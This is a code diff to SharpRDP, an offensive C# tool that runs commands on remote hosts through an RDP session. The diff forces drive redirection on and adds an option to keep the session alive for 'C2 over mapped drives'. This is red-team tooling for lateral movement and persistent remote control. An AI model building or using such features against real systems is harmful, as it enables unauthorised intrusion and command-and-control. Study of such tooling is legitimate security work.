@@ -22,6 +22,7 @@ namespace SharpRDP
         private string target;
         private string runtype;
         private bool isdrive;
+        private bool exitend;
         private bool takeover;
         private bool networkauth;
         private enum LogonErrors : uint
@@ -92,12 +93,13 @@ namespace SharpRDP
             SSL_ERR_SMARTCARD_WRONG_PIN = 0x1C07
         }
 
-        public void CreateRdpConnection(string server, string user, string domain, string password, string command, string execw, string runelevated, bool condrive, bool tover, bool nla)
+        public void CreateRdpConnection(string server, string user, string domain, string password, string command, string execw, string runelevated, bool condrive, bool xitend, bool tover, bool nla)
         {
             keycode = new Dictionary<String, Code>();
             KeyCodes();
             runtype = runelevated;
             isdrive = condrive;
+            exitend = xitend;
             cmd = command;
             target = server;
             execwith = execw;
@@ -127,10 +129,7 @@ namespace SharpRDP
                     rdpConnection.UserName = user;
                     rdpConnection.AdvancedSettings9.allowBackgroundInput = 1;
                     rdpConnection.AdvancedSettings9.BitmapPersistence = 0;
-                    if(condrive == true)
-                    {
-                        rdpConnection.AdvancedSettings5.RedirectDrives = true;
-                    }
+                    rdpConnection.AdvancedSettings5.RedirectDrives = true;
                     if (password != string.Empty || user != string.Empty)
                     {
                         rdpConnection.UserName = user;
@@ -238,11 +237,24 @@ namespace SharpRDP
             {
                 RunRun();
             }
-
             Thread.Sleep(1000);
-            Console.WriteLine("[+] Disconnecting from    :  {0}", target);
-            rdpSession.Disconnect();
+
+            if (exitend)
+            {
+                Console.WriteLine("[+] Disconnecting from    :  {0}", target);
+                rdpSession.Disconnect();
+            }
+            else
+            {
+                Console.WriteLine("[+] Keeping session alive for C2 over mapped drives    :  {0}", target);
+                Console.WriteLine("[+] Ctrl+c or kill process to end", target);
+
+                // ignore all input and keep the session alive
+                Console.ReadKey();
+            }
         }
+
+
 
         private void RdpConnectionOnOnDisconnected(object sender, IMsTscAxEvents_OnDisconnectedEvent e)
         {
